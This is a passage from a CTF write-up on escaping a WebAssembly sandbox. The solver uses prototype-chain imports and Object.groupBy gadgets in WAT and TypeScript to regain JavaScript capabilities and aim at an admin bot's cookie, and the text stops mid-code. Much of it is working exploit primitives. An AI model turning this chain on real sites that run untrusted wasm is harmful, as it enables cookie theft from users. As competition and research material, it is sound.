---
title: "Captivating Canvas Contraption - SekaiCTF 2025"
category: "rev"
subcategory: "wasm"
type: "writeup"
tags: ["rev", "wasm", "prototype-pollution", "sandbox", "javascript", "prototype", "sekaictf", "sekaictf-2025", "2025", "ctf-writeup"]
summary: "Originally published on my personal site"
source:
  name: "CTFtime writeup #40410"
  url: "https://ctftime.org/writeup/40410"
original_source: "https://blog.badat.dev/blog/captivating-canvas-contraption/"
ctf:
  name: "SekaiCTF 2025"
  year: 2025
  challenge: "Captivating Canvas Contraption"
---

## Metadata

- **CTF:** SekaiCTF 2025
- **Task:** Captivating Canvas Contraption
- **Author team:** libteam.so.1
- **CTFtime tags:** wasm, prototype-pollution, sandbox, javascript, prototype
- **CTFtime:** <https://ctftime.org/writeup/40410>
- **Original writeup:** <https://blog.badat.dev/blog/captivating-canvas-contraption/>

---
Originally published on [my personal site](https://blog.badat.dev/blog/captivating-canvas-contraption/)

## Overview

### Captivating Canvas Contraption - 1 solve (me :))

I don't understand how shaders work, so I made a small little site that allows you to use WebAssembly to render to a canvas instead. Share some of your designs with me?

*Author*: Qyn  
*Category*: Web

[https://2025.ctf.sekai.team/challenges/#Captivating-Canvas-Contraption-39](https://2025.ctf.sekai.team/challenges/#Captivating-Canvas-Contraption-39)

### The challenge

As the description says, we're given a simple static website that downloads a wasm file and executes it to render an image.  
There is an admin bot, which has the flag, stored as a cookie.

The webpage uses a relatively secure CSP, only allowing specific scripts to run using integrity hashes, and wasm-eval.

Our wasm code is then executed in a requestAnimationFrame loop(simplifying the code and inlining functions to make things easier to understand):

```javascript  
// wasmData contains our wasm file  
const wasmModule = await WebAssembly.instantiate(wasmData, {  
// stubs for AssemblyScript: <https://www.assemblyscript.org/concepts.html#special-imports>  
env: {  
abort: () => { },  
trace: () => { },  
seed: () => 0,  
}  
});  
const exports = wasmModule.instance.exports;

if (!exports.renderPixel) {  
throw new Error('WebAssembly module must export a "renderPixel" function');  
}

renderPixel = exports.renderPixel;  
setStatus(`Loaded ${wasmName} successfully`, 'success');

const render = () => {  
for (let y = 0; y < 512; y++) {  
for (let x = 0; x < 512; x++) {  
// Call to our wasm here!  
const color = renderPixel(x,y);  
updateCanvas(color, x, y);  
}  
}  
requestAnimationFrame(render)  
}

render();  
```

## Solution

### WAT

Since this challenge looked fairly difficult I expected that having the ability to write wasm on as low of a level as possible. For this reason I chose to solve this challenge in WAT.

In retrospect this was a mistake, and I would've been able to solve the challenge much faster had I used assemblyscript or some other high level language,  
but regardless I think it was a nice skill to pick up, so I will use it throughtout this writeup, alongside JS pseudocode for readibility.

#### WAT primer

To compile code to wasm I just used the `wat2wasm` tool from the webassembly binary toolkit.

As a starter I grabbed the `solid.wasm` example, decompiled it with `wasm2wat` and manually cleaned it up as a base to work from

```typescript  
export function renderPixel(x: i32, y: i32): i32 {  
return 11141375;  
}  
```

```wat  
(module  
(func $renderPixel (result i32)  
i32.const 11141375)  
(export "renderPixel" (func $renderPixel))  
)  
```

WASM code declares imports, which can be functions or externrefs(more later), as well as it's own exports statically ahead of time.

There are 3 data types that we'll be using to interact between wasm and javascript:

\- i32 is a basic number type. Javascript numbers will automatically be converted into i32s as needed and WASM i32s will be converted to javascript numbers.

\- externref is a transparent javascript value. It can be a function an object, a string, anything really. WASM can only store it and pass it as an argument to javascript code,  
but can't interact with it in any other way

\- WASM functions can be passed to javascript and will be treated like any function.  
Very importantly this doesn't work the other way around: WASM cannot call javascript functions that weren't defined as imports ahead of time

### Initial vulnerability

The name of the challenge: "Captivating Canvas Contraption" is very suspicious.  
My immediate thought was that this was a reference to the Chaos Computer Club, possibly referencing some past challenge or a talk given at some CCC event?

After a quick search for "wasm sandbox" on the CCC [media server](<https://media.ccc.de/>).  
I found this talk given by [Thomas Rinsma](<https://th0mas.nl/):> ["Escaping a misleading "sandbox": breaking the WebAssembly-JavaScript barrier"](<https://media.ccc.de/v/why2025-226-escaping-a-misleading-sandbox-breaking-the-webassembly-javascript-barrier>) from WHY2025,  
talking about walking up the javascript object prototypes in order to access functions we aren't supposed to from wasm(also available as a [phrack article](<https://phrack.org/issues/72/10_md#article>) now).

I highly encourage you to listen to the talk or read the paper yourself, it was very well done, but I'll summarize it here:

A Wasm module defines a set of static imports: functions and data that need to be made available to it.  
Imports are always namespaced, so every import is referred to by two keys: the namespace key and the name of the import.  
Under the browser wasm interface these are passed in as the second argument to the `instantiate`, with nested objects  
describing namespaces and imports(for example in this challenge the `env` namespace contains a function called `abort`).

Javascript objects have a prototype that they implicitly inherit all properties from.  
The default prototype for objects defines a few properties:  
```  
~ node  
> ({}).toLocaleString  
[Function: toLocaleString]  
```

no spec specifies that wasm shouldn't resolve imports from the prototype, so our wasm module can import stuff we weren't intended to.

?

Unfortunately there are a few key limitations:

\- We can't control the `this` value when calling functions  
\- We can't create javascript objects ourselves, we can only create numbers and our wasm functions  
\- We can't interact with javascript values ourselves. We can only store them and pass them forward, via the externref type.  
\- We can't call any functions we haven't imported on module load. We have to treat them as externrefs and pass them back to some javascript function that will call them for us.

Despite this we have one saving grace: [`Object.groupBy`](<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy>).  
This is an extremely versitile gadget, allowing us to extract elements from arrays, call arbitrary functions and construct objects.

The talk then goes on to construct strings by calling `String.raw` with `Object.groupBy` and calling eval, to get code execution.  
We cannot reuse that same exploit for this challenge due to the strict CSP, so it's finally time to start thinking for ourselves.

### Getting access to the window object

We need to access `document.cookie` which contains the flag and some way to send it to ourselves.

The only way I can think of to do that is to somehow restore access to the `window` object.  
Most conventional ways of doing that are unavailable to us, since they require some form of eval  
but I remember an obscure (non-standard, v8-only) API we can potentially abuse: [Stack trace customization](https://v8.dev/docs/stack-trace-api#customizing-stack-traces)

Under chrome when reporting an error if an Error.prepareStackTrace function is defined the engine will call it when constructing the error message  
with an array of CallSite objects, which have a `getThis()` function that returns the value of this.

If we are smart about where we cause an error we can trigger an error that somewhere in it's stack trace will have a function where `this` is set to `window`.

Error.prepareStackTrace is only called if something tries to access Error.stack,  
for example when an error is logged, which happens automatically for uncaught errors if devtools are open,  
or... when running under puppetter, like the adminbot.

To define `prepareStackTrace` we could probably somehow get access to `Error`,  
but since `Error` is also an `Object` it's much simpler to just define, `Object.prototype.prepareStackTrace`.

At this point I feelt like I was on the right track so I decided to start hunting for useful gadgets and turning them into primitives

### Primitives

#### Console.log

I'm not familiar with wasm so I decided to go with the good old printf debugging. I modified the challenge code to give myself access to a console.log method

```diff  
// wasmData contains our wasm file  
const wasmModule = await WebAssembly.instantiate(wasmData, {  
// stubs for AssemblyScript: <https://www.assemblyscript.org/concepts.html#special-imports>  
env: {  
abort: () => { },  
trace: () => { },  
seed: () => 0,  
\+ log: (val) => console.log(val)  
}  
});  
```

In production I defined it as a noop function

```typescript  
import { log } from "env"  
import { constructor as Object } from "env"  
/*  
function log(x: externref) {  
}  
*/

export function renderPixel(x: i32, y: i32): i32 {  
// Log [object.name](http://object.name), since we can't construct strings ourselves  
log([Object.name](http://Object.name))  
return 11141375;  
}  
```

```wat  
(import "env" "log" (func $log (param externref)))  
(import "constructor" "name" (global $object_name externref))

(func $renderPixel (result i32)  
;; Log [object.name](http://object.name), since we can't construct strings ourselves  
(call $log (global.get $object_name))  
i32.const 11141375)  
(export "renderPixel" (func $renderPixel))  
```

Next I copied some basic ones from Thomas' talk:

#### Get n-th array element

```typescript  
let indexToSave: i32 = 0  
let savedElement: externref;

function saveNth(element: externref, idx: i32) {  
if(indexToSave == idx) {  
savedElement = element  
}  
}

function getNthArrayElement(array: externref, n: i32) {  
indexToSave = n;  
Object.groupBy(array, saveNth)  
return savedElement  
}

// getNthArrayElement([1,2,3,4], 2]) == 3  
```

```wat  
(import "constructor" "groupBy" (func $group_by (param externref) (param funcref) (result externref)))

(global $idx_to_save (mut i32) (i32.const 0))  
(global $saved_element (mut externref) (ref.null extern))  
(func $save_nth_element (param $val externref) (param $n i32)  
(local.get $n)  
(global.get $idx_to_save)  
i32.eq  
(if  
(then  
(local.get $val)  
(global.set $saved_element)  
)  
)  
)  
(func $get_nth_element (param $arr externref) (param $n i32) (result externref)  
(global.set $idx_to_save (local.get $n))  
(call $group_by (local.get $arr) (ref.func $save_nth_element))  
drop  
(global.get $saved_element)  
)  
```

#### Traversing objects

It's useful to be able to traverse nested objects and get functions and data from them.  
We can't always use `Object.values` here, since it only returns "enumerable" properties.  
Instead we have to make use of `Object.getOwnPropertyDescriptors`  
`getOwnPropertyDescriptors` returns an object with keys describing the properties of an object.

We'll be using hardcoded array indexes. Those are not guaranteed to be stable and differ between engines(eg. firefox and chrome),  
but in practice they are consistent at least on the same browser release, which is good enough for our use case.

```typescript  
function getPropertyByIndex(target: externref, idx: u32) {  
// keyValue object of propery names and their descriptors  
const propDescs = Object.getOwnPropertyDescriptors(target);  
// target property descriptor  
// eg.  
// { value: [Function push], writable: false, enumerable: false, configurable: true }  
const targetDesc = getNthArrayElement(Object.values(propDescs), idx);  
// targetDesc.value  
return getNthArrayElement(Object.values(targetDesc), 0)  
}

// getPropertyByIndex(Object, 3) == Object.assign  
```

```wat  
(import "constructor" "getOwnPropertyDescriptors" (func $get_own_property_descriptors (param externref) (result externref)))  
(import "constructor" "values" (func $object_values (param externref) (result externref)))  
(func $get_property_by_index (param $target externref) (param $idx i32) (result externref)   
(local $prop_descs externref)  
(local $prop_desc externref)  
(local.set $prop_descs   
(call $get_own_property_descriptors (local.get $target))  
)

(local.set $prop_desc  
(call $get_nth_element   
(call $object_values (local.get $prop_descs))  
(local.get $idx)   
)  
)  
(call $get_nth_element   
(call $object_values (local.get $prop_desc))  
(i32.const 0)   
)  
)  
```

With this we can define getters for useful functions, eg.

```typescript  
function getStringClass() {  
const stringProto = Object.getPrototypeOf([Object.name](http://Object.name))  
// stringProto.constructor  
// Hardcoded index  
return getPropertyByIndex(stringProto, 1)  
}

function getStringfromCharCode() {  
// String.fromCharCode  
return getPropertyByIndex(getStringClass(), 3)  
}

// getStringfromCharCode() == String.fromCharCode  
```

```wat  
(import "constructor" "getPrototypeOf" (func $object_get_prototype_of (result externref)))  
(func $get_string_class (result externref)  
(local $string_proto externref)  
(local.set $string_proto (call $object_get_prototype_of (global.get $object_name)))  
(call $get_property_by_index (local.get $string_proto) (i32.const 1))  
)

(func $get_string_from_char_code (result externref)  
(call $get_property_by_index (call $get_string_class) (i32.const 3))  
)  
```

#### Construct single character strings

```typescript  
let char_to_return: i32;  
function returnCh(): i32 {  
return char_to_return  
}

// char is an ascii encoded character  
function makeSingleCharString(char: i32) {  
char_to_return = char;  
// [Object.name](http://Object.name) is the string "Object".  
// It's used here since it's an easy to access iterable  
// Eg. for 65(ascii A) Creates this object  
// { '61': [ 'O', 'b', 'j', 'e', 'c', 't' ] }  
const chObject = Object.groupBy([Object.name](http://Object.name), returnCh)  
// ['61']  
const chArray = Object.keys(chObject)

// We can't call String.fromCharCode directly, since we didn't import it, so we have to use groupBy  
// our char was converted to string in the previous step  
// but String.fromCharCode will implicitly convert it back to a number  
// Gives us:  
// { 'A\x00': [ '65' ] }  
// (the null byte comes, because groupBy passes the index as the second argument)  
const fromCharCodeObj = Object.groupBy(chArray, getStringfromCharCode())  
// 'A\x00'  
const nullStr = getNthArrayElement(Object.keys(fromCharCodeObj), 0)  
// Remove the null  
return getNthArrayElement(nullStr, 0)  
}

// makeSingleCharString(65) == "A"  
```

```wat  
(import "constructor" "keys" (func $object_keys (param externref) (result externref)))

;; We need a second definition of groupBy that we can call with js functions(externrefs)  
(import "constructor" "groupBy" (func $group_by_extref (param externref) (param externref) (result externref)))

(global $char_to_return (mut i32) (i32.const 0))  
(func $return_char (result i32)  
(global.get $char_to_return)  
)  
(export "return_char" (func $return_char))

(func $make_single_char_string (param $ch i32) (result externref)  
(local $ch_object externref)  
(local $ch_array externref)  
(local $from_char_code_obj externref)  
(local $null_str externref)

(global.set $char_to_return (local.get $ch))  
(local.set $ch_object (  
call $group_by   
(global.get $object_name)  
(ref.func $return_char)  
)  
)  
(local.set $ch_array (  
call $object_keys   
(local.get $ch_object)  
)  
)  
(local.set $from_char_code_obj  
(call $group_by_extref   
(local.get $ch_array) (call $get_string_from_char_code)  
)  
)  
(local.set $null_str   
(call $get_nth_element   
(call $object_keys (local.get $from_char_code_obj))   
(i32.const 0)  
)  
)  
(call $get_nth_element   
(local.get $null_str)   
(i32.const 0)  
)  
)  
```

#### Construct single element arrays

Now we're starting to finally get out of what's covered in the talk.

While we can use groupBy to construct some objects we are limited by not being able to fully control their values, since groupBy requires the first argument to be array.  
To solve this we'd need some way to wrap an arbitrary object in a single element array.

Thinking through this I realized that if I could create an object with an arbitrary key, I would be able to call Object.values on it and get what I needed.  
The problem is that with my limited arsenal of functions I don't have an obvious way to do this.  
I could use `Object.defineProperty`, but only if I was able to make a property descriptor object, which also requires me to be able to create arbitrary objects.  
Same think with `Object.assign` and even `Object.create`, I was stuck looking for a bootstrap.

Frustrated I moved onto trying to create other gadgets and when reading more about `Object.defineProperty` I realized something:

Every object has a property that we control: `__proto__`, which is actually a getter/setter pair that calls `Object.getPrototypeOf` and `Object.setPrototypeOf`.  
Since we can call `Object.setPrototypeOf` we fully control the value of `__proto__`  
This property doesn't show up when calling `Object.values`, because it's property descriptor sets `enumerable: false` but we can easily override that.  
While can't craft arbitrary objects yet, we can still take an existing prototype descriptor, modify it and set it back on the original object. Let's try that

```typescript  
// {}  
function emptyObject(): externref {  
Object.create(Object.prototype)  
}

/*  
{  
get: [Function: get __proto__],  
set: [Function: set __proto__],  
enumerable: false,  
configurable: true  
}  
*/  
function get__proto__Descriptor(): externref {  
/*  
{  
get: [Function: get __proto__],  
set: [Function: set __proto__],  
enumerable: false,  
configurable: true  
}  
*/  
const objectPrototypeProperties = Object.getOwnPropertyDescriptors(Object.prototype);  
const protoProp = getNthArrayElement(Object.values(objectPrototypeProperties), 10)  
return protoProp  
}

// "enumerable"  
function getEnumerableString() {  
return getNthArrayElement(Object.keys(get__proto__Descriptor()), 2)  
}

// Helper function for groupBy Calls  
let extref: externref;  
function returnExternRef(): externref {  
return extref  
}

// x => [x]  
function buildSingleElementArray(element: externref): externref {  
const target = emptyObject();

// Construct enumerable: true object.  
// We construct an array, but that's ok since and non empty arrays are considered truthy.  
// {enumerable: [ 'O', 'b', 'j', 'e', 'c', 't' ] }  
extref = getEnumerableString();  
const enumerableDesc = Object.groupBy([Object.name](http://Object.name), returnExternRef)

const descriptor = get__proto__Descriptor();  
// Set enumerable: true  
Object.assign(descriptor, enumerableDesc)

// key doesn't matter, picking a random value  
const targetKey = getStringfromCharCode(0x41)

const target = emptyObject();  
Object.defineProperty(target, targetKey, descriptor)  
Object.setPrototypeOf(target, element)

return Object.values(target);  
}  
```

```wat  
(import "constructor" "prototype" (global $object_prototype externref))  
(import "constructor" "create" (func $object_create (param externref) (result externref)))  
(import "constructor" "assign" (func $object_assign (param externref) (param externref)))  
(import "constructor" "defineProperty" (func $object_define_property (param externref) (param externref) (param externref)))  
(import "constructor" "setPrototypeOf" (func $object_set_prototype_of (param externref) (param externref)))

(global $externref_to_return (mut externref) (ref.null))  
(func $return_externref (result externref)  
(global.get $externref_to_return)  
)  
(export "return_externref" (func $return_externref))

(func $empty_object (result externref)   
(call $object_create (global.get $object_prototype))  
)

(func $get__proto__descriptor (result externref)  
(call $get_nth_element  
(call $object_values  
(call $get_own_property_descriptors (global.get $object_prototype))  
)  
(i32.const 10)  
)  
)

(func $get_enumerable_string (result externref)  
(call $get_nth_element  
(call $object_keys (call $get__proto__descriptor))  
(i32.const 2)  
)  
)

(func $build_single_element_array (param $element externref) (result externref)  
(local $target externref)  
(local $descriptor externref)  
(local $enumerable_desc externref)  
(local $target_key externref)

(local.set $target (call $empty_object))

(global.set $externref_to_return (call $get_enumerable_string))  
(local.set $enumerable_desc   
(call $group_by (global.get $object_name) (ref.func $return_externref))  
)

(local.set $descriptor (call $get__proto__descriptor))  
(call $object_assign (local.get $descriptor) (local.get $enumerable_desc))

(local.set $target_key (call $make_single_char_string (i32.const 0x41)))  
  
(call $object_define_property  
(local.get $target)  
(local.get $target_key)  
(local.get $descriptor)  
)

(call $object_set_prototype_of (local.get $target) (local.get $element))

(call $object_values (local.get $target))  
)  
```

> buildSingleElementArray("asdf") === ["asdf"]   
> Uncaught TypeError: Object.setPrototypeOf: expected an object or null, got string

...huh

strings are not Strings

You migth have experienced this when writing typescript before, but  
in JS by default when creating built in types(eg. `123`, `"string"`) they aren't actually objects, instead they are a primitive type.  
In order to turn them into an object(to eg. call a method on them) we need to use a wrapper class(like `Number` and `String`),  
which isn't a problem, since it happens automatically in 99% of cases.  
`Object.setPrototypeOf` calls happen to be one of the only cases where it doesn't.

This is not a huge issue, we can just wrap the objects in their wrapper classes automatically by calling `Object` on them.

```diff  
function buildSingleElementArray(element: externref): externref {  
const target = emptyObject();

// Construct enumerable: true object.  
// We construct an array, but that's ok since and non empty arrays are considered truthy.  
// {enumerable: [ 'O', 'b', 'j', 'e', 'c', 't' ] }  
extref = getEnumerableString();  
const enumerableDesc = Object.groupBy([Object.name](http://Object.name), returnExternRef)

const descriptor = get__proto__Descriptor();  
// Set enumerable: true  
Object.assign(descriptor, enumerableDesc)

// key doesn't matter, picking a random value  
const targetKey = getStringfromCharCode(0x41)

const target = emptyObject();  
Object.defineProperty(target, targetKey, descriptor)  
\+ Object.setPrototypeOf(target, element)  
\+ Object.setPrototypeOf(target, Object(element))

return Object.values(target);  
}  
```

```diff  
+(import "__proto__" "constructor" (global $object externref))

\- (call $object_set_prototype_of (local.get $target) (local.get $element))  
\+ (call $object_set_prototype_of (local.get $target) (  
\+ call $object (local.get $element)  
\+ ))

```  
#### Set arbitrary properties on an object

If we are able to create an array with 2 elements, we can use `Object.fromEntries` to create arbitrary KV objects,  
which in turn we can use with `Object.assign` to set arbitrary properties and create arbitrary objects.

In order to do this we need to create an object with two properties we control:  
a string(or a value that can be stringified) to use as a key and another arbitrary object to use as the value.

We can create an object containing the first property by passing a string wrapped in an array as the first argument to  
Object.group_by. This will create an object {"a": ["key"]}, which is good enough for our use case, since fromEntries  
will stringify the key, and arrays are stringified by joining them, which in our case results in it becoming just `"key"`

We can get the second property on our object by using the same `__proto__` enumerable hack we did before.

After that we can call `Object.fromEntries` to create an array. The order of values returned by `Object.values` isn't guaranteed  
as far as I am aware, but(at least in chromium) seems to preserve insertion order, which is good enough for us.

```typescript  
function buildKVObject(key: externref, value: externref): externref {  
const wrappedValue = buildSingleElementArray(key);  
// Doesn't matter, any value is fine  
char_to_return = 0x41;  
// {"a": ["key"]}  
const kv = Object.groupBy(buildSingleElementArray(key), return_char)

extref = getEnumerableString();  
const enumerableDesc = Object.groupBy([Object.name](http://Object.name), returnExternRef)

const descriptor = get__proto__Descriptor();  
// Set enumerable: true  
Object.assign(descriptor, enumerableDesc)

const key = makeSingleCharString(0x41);  
Object.defineProperty(kv, key, descriptor)  
Object.setPrototypeOf(kv, value)

return Object.fromEntries(buildSingleElementArray(Object.entries(kv)))  
}

// buildKVObject("asdf", [123]) == {"asdf": 123}

function set(target: externref, key: externref, value: externref) {  
const kv = buildKVObject(key, value);  
Object.assign(target, kv);  
}  
```

```wat  
(import "constructor" "fromEntries" (func $object_from_entries (param externref) (result externref)))  
(func $build_kv_object (param $key externref) (param $value externref) (result externref)  
(local $kv externref)  
(local $descriptor externref)  
(local $enumerable_desc externref)  
(local $target_key externref)

(local.set $target_key (call $make_single_char_string (i32.const 0x41)))

(global.set $char_to_return (i32.const 0x41))  
(local.set $kv (call $group_by   
(call $build_single_element_array (local.get $key))  
(ref.func $return_char)  
))

(local.set $enumerable_desc   
(call $group_by (global.get $object_name) (ref.func $return_externref))  
)

(local.set $descriptor (call $get__proto__descriptor))  
(call $object_assign (local.get $descriptor) (local.get $enumerable_desc))

(local.set $target_key (call $make_single_char_string (i32.const 0x41)))  
  
(call $object_define_property  
(local.get $kv)  
(local.get $target_key)  
(local.get $descriptor)  
)

(call $object_set_prototype_of (local.get $kv)   
(call $object (local.get $value))  
)  
(call $object_from_entries  
(call $build_single_element_array (call $object_values (local.get $kv)))  
)  
)

(func $set (param $target externref) (param $key externref) (param $value externref)  
(call $object_assign  
(local.get $target)  
(call $build_kv_object (local.get $key) (local.get $value))  
)  
)  
```

#### Call functions while controlling this

Only being able to call static functions is extremely restrictive so we need to figure out a way to control `this`.  
While reading about [globalThis polyfills](<https://mathiasbynens.be/notes/globalthis>) in the hopes of finding an easier way to get access to `window` from wasm  
I found that when calling setters and getters the javascript engine will set thish to the object the setter/getter is defined on, no matter how it is accessed.  
This means that we can use `Object.assign` to read/write to those properties and call any function that way!

Sadly when using setters we don't get the return value, and when using getters we don't get to pass any arguments, but that's a problem for future us to solve.

```typescript  
function saveElem(element: externref) {  
savedElement = element  
}

function getLastArrayElement(array: externref, n: i32) {  
Object.groupBy(array, saveElem)  
return savedElement  
}

// "get"  
function getGetString() {  
return getNthArrayElement(Object.keys(get__proto__Descriptor()), 0)  
}

// "set"  
function getSetString() {  
return getNthArrayElement(Object.keys(get__proto__Descriptor()), 1)  
}

// "configurable"  
function getConfigurableString() {  
return getNthArrayElement(Object.keys(get__proto__Descriptor()), 3)  
}

function callWithThis(this: externref, func: externref): externref {  
// Doesn't matter what the key is, we just need it to be something  
const key = getStringfromCharCode(0x42);

const descriptor = emptyObject();

// Using [Object.name](http://Object.name) here as a bool true  
set(descriptor, getEnumerableString(), [Object.name](http://Object.name))  
// Set configurable to true so we can change this property in the future if needed  
set(descriptor, getConfigurableString(), [Object.name](http://Object.name))  
set(descriptor, getGetString(), function)

Object.defineProperty(this, key, descriptor);

// Object.values calls the getter for us  
const values = Object.values(source)

return getLastArrayElement(values, 0)  
}

// Call using a setter  
// Can't return anything here, so this is only useful for side effects  
function callWithThisAndArg(this: externref, func: externref, arg: externref) {  
// Doesn't matter what the key is, we just need it to be something  
const key = getStringfromCharCode(0x42);

const descriptor = emptyObject();

// Using [Object.name](http://Object.name) here as a bool true  
set(descriptor, getEnumerableString(), [Object.name](http://Object.name))  
// Set configurable to true so we can change this property in the future if needed  
set(descriptor, getConfigurableString(), [Object.name](http://Object.name))  
set(descriptor, getSetString(), func)

Object.defineProperty(this, key, descriptor);

// Calls Object.assign, which calls the setter  
set(this, key, value);  
}  
```

```wat  
(func $save_elem (param $elem externref)  
(global.set $saved_element (local.get $elem))  
)  
(export "saveElem" (func $save_elem))

(func $get_last_element (param $arr externref) (result externref)  
(call $group_by (local.get $arr) (ref.func $save_elem))  
drop  
(global.get $saved_element)  
)

(func $get_get_string (result externref)  
(call $get_nth_element  
(call $object_keys (call $get__proto__descriptor))  
(i32.const 0)  
)  
)

(func $get_set_string (result externref)  
(call $get_nth_element  
(call $object_keys (call $get__proto__descriptor))  
(i32.const 1)  
)  
)

(func $get_configurable_string (result externref)  
(call $get_nth_element  
(call $object_keys (call $get__proto__descriptor))  
(i32.const 3)  
)  
)

(func $call_with_this (param $this externref) (param $func externref) (result externref)  
(local $key externref)  
(local $descriptor externref)  
  
(local.set $key (call $make_single_char_string (i32.const 0x41)))  
(local.set $descriptor (call $empty_object))

(call $set (local.get $descriptor) (call $get_enumerable_string) (global.get $object_name))  
(call $set (local.get $descriptor) (call $get_configurable_string) (global.get $object_name))  
(call $set (local.get $descriptor) (call $get_get_string) (local.get $func))  
  
(call $object_define_property (local.get $this) (local.get $key) (local.get $descriptor))  
(call $get_last_element (call $object_values (local.get $this)))  
)

(func $call_with_this_and_arg (param $this externref) (param $func externref) (param $arg externref)  
(local $key externref)  
(local $descriptor externref)  
  
(local.set $key (call $make_single_char_string (i32.const 0x41)))  
(local.set $descriptor (call $empty_object))

(call $set (local.get $descriptor) (call $get_enumerable_string) (global.get $object_name))  
(call $set (local.get $descriptor) (call $get_configurable_string) (global.get $object_name))  
(call $set (local.get $descriptor) (call $get_set_string) (local.get $func))  
  
(call $object_define_property (local.get $this) (local.get $key) (local.get $descriptor))  
  
(call $set (local.get $this) (local.get $key) (local.get $arg))  
)  
```

Our options for function calls now are

| | Object.groupBy | getters | setters |  
|----|----------------|---------|---------|  
| control this | no | yea | yes |  
| control args | yes | no | yes |  
| return value | stringified | yes | no |

With all of these primitives can we do better?

#### Building arbitrary strings

I started to feel really confident in what I had. I had so many options: I could call Promise.then if needed, I could call fetch(if I had access to it), I could crete arbitrary objects. I could push to array, map them. I could do so much!

...

Which just made it so much more frustrating that I couldn't build a simple string

I started researching, checking all the possible string methods, array methods, even promises, anything I could use.

The only thing I found was that by using reduce I could control two arguments when calling functions with `Array.prototype.reduce`, roughly like so:

```typescript  
[arg1, arg2].reduce(func)  
```

(A proper definition of this function based on previous primitives, that can actually run in wasm left as an excercise to the reader)  
but that didn't let me control `this` restricting me to static functions.  
Slight improvement over Object.groupBy at best, but didn't really get me anywhere, until I had an epiphany:

Most higher-order array functions, like `Array.prototype.map`, `Array.from` and `Array.prototype.find` take an additional argument at the end, `thisArg`, which specifies what `this` will be set when calling the user provided callback.  
(oddly `Array.prototype.reduce` doesn't take that argument)

We can't make use of this with the vast majority of functions, since our only way of specifying multiple arguments(`reduce`) doesn't let us control `this()`, but there is one very notable exception:

`Array.from(items, mapFn, thisArg)`

`thisArg` here is a third argument, meaning we have no control over it, right? WRONG!

`reduce` actually passes a third argument. The element index.   
Which is a number.   
And numbers in javascript are objects.   
Which have prototypes. 

So if we do

```typescript  
> Object.setPrototypeOf(Number.prototype, ["p","r","e"])  
[Number (Array): 0]  
> Array.from([""], Array.prototype.join, 1)  
[ 'pre' ]  
> [[""], Array.prototype.join].reduce(Array.from)  
[ 'pre' ]  
```

hhahahaha yes;

now we just need some way to get the result out of the reduce call, but that is surprisingly easy.  
If we just tackle on a function at the end Array.from will call it with the result of our previous Array.from call  
Basically what we're doing is

```typescript  
let saved;  
function saveVal(x) {  
saved = x;  
}

const joinedString = Array.from([""], Array.prototype.join, ["p","r","e"])  
Array.from(joinedString, saveVal);  
```

but in a very roundabout way.

Let's put this into practice

```typescript  
function emptyString(): externref {  
return callWithThis(  
// Doesn't matter what this is.  
// `callWithThis` is just the easiest way to call the function without arguments  
emptyObject(),  
getStringfromCharCode())  
}

function emptyArray(): externref {  
return Object.keys(emptyObject())  
}

function getNumberPrototype(): externref {  
return Object.getPrototypeOf(1)  
}

function getArrayPrototype(): externref {  
return Object.getPrototypeOf(emptyArray())  
}

function getArrayConstructor(): externref {  
return getPropertyByIndex(getArrayPrototype(), 1)  
}

function getArrayFrom(): externref {  
return getPropertyByIndex(getArrayConstructor(), 4)  
}

function getArrayPrototypePush(): externref {  
return getPropertyByIndex(getArrayPrototype(), 12)  
}

function getArrayPrototypeJoin(): externref {  
return getPropertyByIndex(getArrayPrototype(), 21)  
}

function getArrayPrototypeReduce(): externref {  
return getPropertyByIndex(getArrayPrototype(), 32)  
}

function arrayPush(arr: externref, val: externref) {  
callWithThisAndArg(arr, getArrayPrototypePush, val);  
}

function arrayJoin(arr: externref): externref {  
setPrototypeOf(getNumberPrototype(), arr)

// [[]]  
// Empty arrays get stringified as empty strings  
// And it's easier for us to create an empty array than a string  
// Since we already have a function defined for it  
const joinArgs = emptyArray()  
arrayPush(joinArgs, emptyArray())

// [[[]], Array.prototype.join, saveVal]  
const reducerArray = emptyArray()  
arrayPush(reducerArray, joinArgs)  
arrayPush(reducerArray, getArrayPrototypeJoin())  
// need to wrap the save_elem func with Object to turn it from a funcref to a externref  
arrayPush(reducerArray, Object(save_elem))

// reducerArray.reduce(Array.from)  
callWithThisAndArg(reducerArray, getArrayPrototypeReduce(), getArrayFrom())

// Restore the original prototype  
setPrototypeOf(getNumberPrototype(), Object.prototype)

return saved_element  
}

function getPrepareStackTraceString(): externref {  
// ["p", "r", "e", "p", "a", "r", "e", "S", "t", "a", "c", "k", "T", "r", "a", "c", "e"]  
const unjoined = emptyArray()  
// p  
arrayPush(getStringfromCharCode(0x70))  
// r  
arrayPush(getStringfromCharCode(0x72))  
// e  
arrayPush(getStringfromCharCode(0x65))  
// p  
arrayPush(getStringfromCharCode(0x70))  
// and so on[...]

return arrayJoin(unjoined)  
}

// getPrepareStackTraceString() == "prepareStackTrace"  
```

```wat  
(func $empty_string (result externref)  
(call $call_with_this  
(call $empty_object)  
(call $get_string_from_char_code)  
)  
)

(func $empty_array (result externref)  
(call $object_keys (call $empty_object))  
)

;; (import "constructor" "getPrototypeOf" (func $object_get_prototype_of_number (param i32) (result externref)))  
(func $get_number_prototype (result externref)  
(call $object_get_prototype_of_number (i32.const 0x0))  
)

(func $get_array_prototype (result externref)  
(call $object_get_prototype_of (call $empty_array))  
)

(func $get_array_constructor (result externref)  
(call $get_property_by_index (call $get_array_prototype) (i32.const 1))  
)

(func $get_array_from (result externref)  
(call $get_property_by_index (call $get_array_constructor) (i32.const 4))  
)

(func $get_array_prototype_push (result externref)  
(call $get_property_by_index (call $get_array_prototype) (i32.const 12))  
)

(func $get_array_prototype_join (result externref)  
(call $get_property_by_index (call $get_array_prototype) (i32.const 21))  
)

(func $get_array_prototype_reduce (result externref)  
(call $get_property_by_index (call $get_array_prototype) (i32.const 32))  
)

(func $array_push (param $arr externref) (param $val externref)  
(call $call_with_this_and_arg (local.get $arr) (call $get_array_prototype_push) (local.get $val))  
)

;;(import "__proto__" "constructor" (func $object_funcref (param funcref) (result externref)))  
(func $array_join (param $arr externref) (result externref)  
(local $join_args externref)  
(local $reducer_array externref)

(local.set $join_args (call $empty_array))  
(local.set $reducer_array (call $empty_array))  
  
(call $array_push (local.get $join_args) (call $empty_array))

(call $array_push (local.get $reducer_array) (local.get $join_args))  
(call $array_push (local.get $reducer_array) (call $get_array_prototype_join))  
(call $array_push (local.get $reducer_array) (call $object_funcref (ref.func $save_elem)))

